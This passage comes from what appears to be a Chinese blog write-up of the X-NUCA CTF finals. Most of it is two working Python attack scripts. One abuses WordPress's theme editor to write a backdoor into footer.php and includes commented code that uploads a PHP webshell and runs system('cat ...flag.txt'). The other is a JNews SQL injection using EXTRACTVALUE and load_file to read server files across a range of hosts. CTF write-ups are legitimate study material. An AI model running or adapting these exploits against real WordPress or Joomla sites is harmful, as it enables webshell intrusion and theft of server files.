		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'Content-Disposition: form-data; name="%s"</span><span class="se">\r\n</span><span class="s">'</span> <span class="o">%</span> <span class="s">'file'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'footer.php'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'Content-Disposition: form-data; name="%s"</span><span class="se">\r\n</span><span class="s">'</span> <span class="o">%</span> <span class="s">'theme'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'AccountingTime'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'Content-Disposition: form-data; name="%s"</span><span class="se">\r\n</span><span class="s">'</span> <span class="o">%</span> <span class="s">'scrollto'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'818.1818237304688'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'Content-Disposition: form-data; name="%s"</span><span class="se">\r\n</span><span class="s">'</span> <span class="o">%</span> <span class="s">'docs-list'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'Content-Disposition: form-data; name="%s"</span><span class="se">\r\n</span><span class="s">'</span> <span class="o">%</span> <span class="s">'submit'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'更新文件'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

		<span class="c1"># file = open('fuck.php','rb')
</span>		<span class="c1"># data.append('Content-Disposition: form-data; name="%s"; filename="123.php\r\n' % 'pluginzip')
</span>		<span class="c1"># data.append('Content-Type: text/php\r\n')
</span>		<span class="c1"># data.append(file.read())
</span>		<span class="c1"># file.close()
</span>		<span class="c1"># data.append('--%s--\r\n' % boundary)
</span>
		<span class="c1"># data.append('Content-Disposition: form-data; name="%s"\r\n' % 'install-plugin-submit')
</span>		<span class="c1"># data.append('现在安装')
</span>		<span class="c1"># data.append('--%s' % boundary)
</span>
		<span class="n">uploadUrl</span> <span class="o">=</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">'/wp-admin/theme-editor.php'</span>
		<span class="n">http_body</span><span class="o">=</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

		<span class="n">req</span><span class="o">=</span><span class="n">urllib2</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">uploadUrl</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">http_body</span><span class="p">)</span>
		<span class="n">req</span><span class="p">.</span><span class="n">add_header</span><span class="p">(</span><span class="s">'Content-Type'</span><span class="p">,</span> <span class="s">'multipart/form-data; boundary=%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>
		<span class="n">req</span><span class="p">.</span><span class="n">add_header</span><span class="p">(</span><span class="s">'User-Agent'</span><span class="p">,</span><span class="s">'Mozilla/5.0'</span><span class="p">)</span>
		<span class="k">try</span> <span class="p">:</span> 
			<span class="n">res</span> <span class="o">=</span> <span class="n">opener</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
		<span class="k">except</span> <span class="n">socket</span><span class="p">.</span><span class="n">timeout</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
			<span class="k">pass</span>
		<span class="n">content</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
		<span class="k">if</span> <span class="s">'文件修改成功'</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span> <span class="c1">#后面为了方便就把上传和修改footer文件写在一起了。。。 注释掉的都是上传的
</span>			<span class="k">print</span> <span class="s">'[!] '</span> <span class="o">+</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">' getShell through footer.php'</span>
			<span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">root_url</span><span class="o">+</span><span class="s">'/?pr0ph3t=dalaohao'</span><span class="p">)</span>
			<span class="n">res</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
			<span class="n">content</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
			<span class="k">if</span> <span class="s">'gongfang'</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
				<span class="k">print</span> <span class="s">'[!!] '</span> <span class="o">+</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">' get flag '</span> <span class="o">+</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'gongfang_flag\{(.*)\}'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
		<span class="c1"># if '正在安装您上传的插件' in content:
</span>		<span class="c1"># 	print '[!] Upload Shell success! Path : /wp-content/uploads/2017/12/123.php'
</span>		<span class="c1"># 	req = urllib2.Request(root_url+'/wp-content/uploads/2017/12/123.php')
</span>		<span class="c1"># 	req1 = urllib2.Request(root_url+'/wp-content/uploads/2017/12/.db.inc.php')
</span>		<span class="c1"># 	try:
</span>		<span class="c1"># 		urllib2.urlopen(req1, timeout=0.2)
</span>		<span class="c1"># 	except socket.timeout as e:
</span>		<span class="c1"># 		pass
</span>		<span class="c1"># 	try:
</span>		<span class="c1"># 		urllib2.urlopen(req, timeout=0.2)
</span>		<span class="c1"># 	except socket.timeout as e:
</span>		<span class="c1"># 		pass
</span>		<span class="c1"># 	req = urllib2.Request(root_url+'/wp-content/uploads/2017/12/.index.php',data=json.dumps({"p":"密码","c":"system('cat+/opt/xnuca/flag.txt');"}))
</span>		<span class="c1"># 	res = urllib2.urlopen(req)
</span>		<span class="c1"># 	print root_url + ' flag is : ' + res.read()
</span>		<span class="c1"># else:
</span>		<span class="c1"># 	print '[?] Upload Fail....'
</span>	<span class="k">except</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">URLError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">'upload error'</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">reason</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">20</span><span class="p">):</span>
	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
		<span class="k">continue</span>
	<span class="n">target</span> <span class="o">=</span> <span class="s">'http://192.121.'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="s">'.31'</span>
<span class="c1"># target = 'http://192.108.1.30:8002'# + str(x)
</span>	<span class="n">easy_webshell</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="c1"># ok!
</span>	<span class="n">LFI</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="c1"># ???
</span>	<span class="n">uploadShell</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</code></pre></div></div>

<hr />

<p>web2的因为没有在第一天获取到源码分析，所以比较吃亏。。队友找了很久才找到一个注入，也同样是利用load_file读取flag，这也是后面我们打得这么凶的原因，注入点：
JNews注入：<a href="https://www.exploit-db.com/exploits/38565/">exp</a>
我们的利用脚本</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">se</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">getToken</span><span class="p">(</span><span class="n">hostname</span><span class="o">=</span><span class="s">'192.108.1.14:1180'</span><span class="p">,</span><span class="n">pos</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">):</span>
	<span class="n">url</span> <span class="o">=</span> <span class="s">'http://'</span><span class="o">+</span><span class="n">hostname</span><span class="o">+</span><span class="s">'/index.php?option=com_jnews&amp;view=subscribe&amp;act=subone&amp;Itemid=206'</span>
	<span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="n">content</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">content</span>
	<span class="n">tokenGroup</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'name="Itemid" value="206" /&gt;&lt;input type="hidden" name="(.*)" value'</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">tokenGroup</span> <span class="o">!=</span> <span class="p">[]:</span>
		<span class="n">token</span> <span class="o">=</span> <span class="n">tokenGroup</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">token</span> <span class="o">=</span> <span class="s">''</span>
	

	<span class="c1">#post data
</span>	<span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'Itemid'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'206'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'123123'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'email'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'123@123.com'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'receive_html'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'1'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'timezone'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'00%3A00%3A00'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'confirmed'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'1'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'subscribed[1]'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'1'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'sub_list_id[1]'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"1 AND EXTRACTVALUE(8483,CONCAT(0x5c,(SELECT(ELT(8483=8483,substr(load_file('/opt/xnuca/flag.txt'),"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">pos</span><span class="p">)</span><span class="o">+</span><span class="s">","</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">)</span><span class="o">+</span><span class="s">")))),0x716b786b71))"</span> <span class="c1">#point
</span>	<span class="n">data</span><span class="p">[</span><span class="s">'acc_level[1]'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'29'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'passwordA'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'FJTx2ubwvj2BA'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'fromFrontend'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'1'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'act'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'subscribe'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'subscriber_id'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'0'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'0'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'option'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'com_jnews'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'task'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'save'</span>
	<span class="n">data</span><span class="p">[</span><span class="s">'boxchecked'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'0'</span>
	<span class="n">data</span><span class="p">[</span><span class="n">token</span><span class="p">]</span> <span class="o">=</span> <span class="s">'1'</span>
	
	<span class="n">vulUrl</span> <span class="o">=</span> <span class="s">'http://'</span><span class="o">+</span> <span class="n">hostname</span> <span class="o">+</span><span class="s">'/index.php/component/jnews/'</span>
	<span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">vulUrl</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
	<span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'XPATH syntax error: &amp;#039;\\(.*)&amp;#039; SQL='</span><span class="p">,</span><span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">flag</span> <span class="o">!=</span> <span class="p">[]:</span>
		<span class="k">return</span> <span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="s">'error'</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">20</span><span class="p">):</span> <span class="c1">#跳过一些确认打不了的主机加快时间
</span>	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
		<span class="k">continue</span>
	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
		<span class="k">continue</span>
	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">7</span><span class="p">:</span>
		<span class="k">continue</span>
	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span>
		<span class="k">continue</span>
	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">11</span><span class="p">:</span>
		<span class="k">continue</span>
	<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">12</span><span class="p">:</span>
		<span class="k">continue</span>
<span class="c1"># hostname = '192.108.1.14:1180'
</span>	<span class="n">hostname</span> <span class="o">=</span> <span class="s">'192.121.'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="s">'.34'</span>
	<span class="n">win</span> <span class="o">=</span> <span class="s">''</span>
	<span class="n">win</span> <span class="o">=</span> <span class="n">getToken</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">win</span> <span class="o">+=</span> <span class="n">getToken</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span>
	<span class="n">win</span> <span class="o">+=</span> <span class="n">getToken</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">17</span><span class="p">)[:</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span>
	<span class="k">print</span> <span class="n">hostname</span> <span class="o">+</span> <span class="s">' get flag '</span> <span class="o">+</span><span class="n">win</span>
</code></pre></div></div>

<hr />

<ul>
  <li>第二天全天
    <ul>
      <li>被虐</li>
    </ul>
  </li>
</ul>

<hr />
<p>总结来说这次比赛还是有不足的，第一就是个人赛的有点瓜皮。。。主办方给的提示是题目都没有暴力操作。。。所以自己就很麻瓜的连扫目录都懒得扫了。。。导致错过www.zip文件。第二就是策略不太对，第一天应该侧重点在渗透和下源码，而不是一被打了就乱了节奏 Orz 师傅们都太强了。。。</p>

  </article>

	<p class="feed-recomendation">
		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
	</p>

  <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'pr0ph3t';
    var disqus_config = function () {
        this.page.identifier = "/posts/X-NUCA-%E6%80%BB%E5%86%B3%E8%B5%9B%E5%B0%8F%E7%BB%93/";
    };
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      Thx!
    </footer>
  </div>
</div>
<script src="https://libs.cdnjs.net/jquery/3.3.1/jquery.min.js"></script>
<script src="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css"></script>
<script>
$(document).ready(function() {
	$("img").each(function() {
		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
		$(this).wrapAll(strA);
    });
});
</script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-87275583-1']);
  _gaq.push(['_trackPageview']);
 (function() {
   var ga = document.createElement('script');ga.type = 'text/javascript'; ga.async = true;
   ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
   var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>
    AV.initialize("FUf6n3OvGTkv0cqnGGbJyS5Q-MdYXbMMI", "FV3i9cojG6DyOMel86rUaaqR");
    AV.useAVCloudUS();
    //新增访问次数
    function addCount(Counter) {
      // 页面（博客文章）中的信息：leancloud_visitors
      // id为page.url， data-flag-title为page.title
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("visited_times");// 将点击次数加1
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                var newTimes = counter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            // 执行这里，说明LeanCloud中还没有记录此文章
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("post_title", title);// 把文章标题
            newcounter.set("post_url", url); // 文章url
            newcounter.set("visited_times", 1); // 初始点击次数：1次
            newcounter.save(null, { // 上传到LeanCloud服务器中
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                var newTimes = newcounter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //仅根据url和title查出当前访问次数，不做+1操作
    function showCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            var $element = $(document.getElementById(url));
            var newTimes = counter.get('visited_times');
            $element.find('.leancloud-visitors-count').text(newTimes);
          } else {
            //如果表里没查到记录，那就是异常情况了
            console.log('异常情况，不应该没记录的');
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //调用API获取IP
    function getVisitorIpAndJudge() {
      var ip;
      var options = {
        type: 'GET',
        url: "https://ctf.pr0ph3t.com/"
      };
      $.ajax(options)
      .done(function(data, textStatus, jqXHR) {
        if(textStatus == "success") {
          ip = data.trim().split('<br>')[0];
        }
        judgeVisitor(ip)
      });
    }

    //判断访客是否已访问过该文章，及访问时间，符合条件则增加一次访问次数
    function judgeVisitor(ip) {
      var Counter = AV.Object.extend("visited_times");
      var Visitor = AV.Object.extend("visitors_record");

      var $postInfo = $(".leancloud_visitors");
      var post_url = $postInfo.attr('id').trim();

      var query = new AV.Query(Visitor);

      query.equalTo("visitor_ip", ip);
      query.equalTo("post_url", post_url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            console.log('该IP已访问过该文章');

            var oldVisitor = results[0];

            var lastTime = oldVisitor.updatedAt;
            var curTime = new Date();

            var timePassed = curTime.getTime() - lastTime.getTime();

            if(timePassed > 1 * 60 * 1000) {
              console.log('距离该IP上一次访问该文章已超过了1分钟，更新访问记录，并增加访问次数');

              addCount(Counter);

              oldVisitor.fetchWhenSave(true);
              oldVisitor.save(null, {
                success: function(oldVisitor) { },
                error: function(oldVisitor, error) {
                  console.log('Failed to save visitor record, with error message: ' + error.message);
                }
              });
            } else {
              console.log('这是该IP 1分钟内重复访问该文章，不更新访问记录，不增加访问次数');
              showCount(Counter);
            }
          } else {
            console.log('该IP第一次访问该文章，保存新的访问记录，并增加访问次数');

            addCount(Counter);

            var newVisitor = new Visitor();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newVisitor.setACL(acl);
            newVisitor.set("visitor_ip", ip);
            newVisitor.set("post_url", post_url);
            newVisitor.save(null, { // 上传到LeanCloud服务器中
              success: function(newVisitor) { },
              error: function(newVisitor, error) {
                console.log('Failed to create visitor record, with error message: ' + error.message);
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
          addCount(Counter);
        }
      });
    }

    $(function() {
      if ($('.leancloud_visitors').length == 1) {
        // 文章页面，调用判断方法，对符合条件的访问增加访问次数
        getVisitorIpAndJudge();
      } else if ($('.post-link').length > 1){
        // 首页 暂未使用
        // showHitCount(Counter);
      }
    });
  </script>

<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->

      </div>
    </body>
</html>
